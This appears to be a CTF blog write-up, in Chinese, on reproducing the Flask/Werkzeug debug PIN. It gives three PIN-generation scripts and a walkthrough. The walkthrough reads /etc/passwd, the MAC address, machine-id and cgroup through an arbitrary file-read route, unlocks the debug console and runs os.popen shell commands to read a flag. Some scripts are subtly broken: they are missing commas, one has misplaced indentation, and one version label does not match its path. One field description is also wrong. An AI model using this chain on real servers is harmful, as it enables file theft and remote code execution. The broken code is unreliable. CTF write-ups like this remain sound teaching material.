@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>flask_pin · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">flask_pin</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-03-29</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="flask-pin"><a href="#flask-pin" class="headerlink" title="flask_pin"></a>flask_pin</h1><h2 id="1-什么是pin码"><a href="#1-什么是pin码" class="headerlink" title="1.什么是pin码"></a><strong>1.什么是pin码</strong></h2><p>pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。</p>
+<h2 id="2-PIN生成要素"><a href="#2-PIN生成要素" class="headerlink" title="2.PIN生成要素"></a>2.<strong>PIN生成要素</strong></h2><ul>
+<li>username，用户名</li>
+<li>modname，默认值为flask.app</li>
+<li>appname，默认值为Flask</li>
+<li>moddir，flask库下app.py的绝对路径</li>
+<li>uuidnode，当前网络的mac地址的十进制数</li>
+<li>machine_id，docker机器id</li>
+</ul>
+<p><strong>username</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getpass.getuser()读取，通过文件读取/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>modname</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(mod,“file”,None)读取，默认值为flask.app</span><br></pre></td></tr></table></figure>
+
+<p><strong>appname</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(app,“name”,type(app).name)读取，默认值为Flask</span><br></pre></td></tr></table></figure>
+
+<p><strong>moddir</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取</span><br></pre></td></tr></table></figure>
+
+<p><strong>uuidnode</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</span><br></pre></td></tr></table></figure>
+
+<p><strong>machine_id</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，docker靶机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</span><br><span class="line">/etc/machine-id</span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line">/proc/self/cgroup</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-上面的pin元素能干嘛呢"><a href="#3-上面的pin元素能干嘛呢" class="headerlink" title="3.上面的pin元素能干嘛呢"></a>3.<strong>上面的pin元素能干嘛呢</strong></h2><p>生成pin码的脚本如下：</p>
+<p>pytho3.5版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,# username</span><br><span class="line">    &#x27;flask.app&#x27;,# modname</span><br><span class="line">    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377892354&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">    &#x27;32e48d371198e8420c53b0a1fa37e94d&#x27;# get_machine_id(), /etc/machine-id+/proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>官方是通过系统命令获取相对应的值，我们采用读文件获取值后放到脚本(也就是官方加密的方法)里进行加密，3.6采用MD5加密，3.8采用sha1加密，所以脚本稍有不同</p>
+<p>python3.6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#MD5</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     &#x27;flaskweb&#x27;# username</span><br><span class="line">     &#x27;flask.app&#x27;,# modname</span><br><span class="line">     &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">     &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     &#x27;25214234362297&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">     &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">   h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">   num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">   for group_size in 5, 4, 3:</span><br><span class="line">       if len(num) % group_size == 0:</span><br><span class="line">          rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                      for x in range(0, len(num), group_size))</span><br><span class="line">          break</span><br><span class="line">       else:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>python3.8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;# /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,# 默认值</span><br><span class="line">    &#x27;Flask&#x27;,# 默认值</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377581187&#x27;,#  /sys/class/net/eth0/address 16进制转10进制</span><br><span class="line">    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="line">    &#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;#  /proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据上述的信息，我们要先获得正确的pin码，那就一个个来吧</p>
+<p>1.<strong>确定python版本</strong></p>
+<p>python版本为3.5</p>
+<p>2.<strong>确定flask的存储位置</strong></p>
+<p>根据实例报错可知路径为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;site-packages&#x2F;flask&#x2F;app.py</p>
+<p>3.<strong>获取username</strong></p>
+<p>根据源代码可知，root下面有个file路径可以访问其他文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：/file?filename=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>username为root</p>
+<p>4.<strong>获取uuidnode</strong></p>
+<p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p>
+<p>得到uuidnode的十六进制为：02:42:ac:02:1f:fc</p>
+<p>我们需要将其转化为10进制：2485376917500</p>
+<p>5.<strong>获取machine_id</strong></p>
+<p>访问&#x2F;etc&#x2F;machine-id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c31eea55a29431535ff01de94bdcf5cf</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;proc&#x2F;self&#x2F;cgroup</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27f9f599813e5072c65483b50b8e6174b44d216d88028c399feb87c8c4eed31e</span><br></pre></td></tr></table></figure>
+
+<p>6.<strong>运行脚本获取pin码</strong></p>
+<p>7.进入console路由</p>
+<p>输入pin码后进入调试模式</p>
+<p>8.控制台导入os模块，运行语句，获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.popen(&#x27;ls&#x27;).read()</span><br><span class="line">os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">os.popen(&#x27;cat /flaggggg&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/03/29/flask-pin/">http://1768161086.github,io/2025/03/29/flask-pin/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2025/03/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化"><span>NextPost ></span><br><span class="nextTitle">pickle反序列化</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#flask-pin"><span class="toc-number">1.</span> <span class="toc-text">flask_pin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFpin%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">1.什么是pin码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PIN%E7%94%9F%E6%88%90%E8%A6%81%E7%B4%A0"><span class="toc-number">1.2.</span> <span class="toc-text">2.PIN生成要素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%8A%E9%9D%A2%E7%9A%84pin%E5%85%83%E7%B4%A0%E8%83%BD%E5%B9%B2%E5%98%9B%E5%91%A2"><span class="toc-number">1.3.</span> <span class="toc-text">3.上面的pin元素能干嘛呢</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
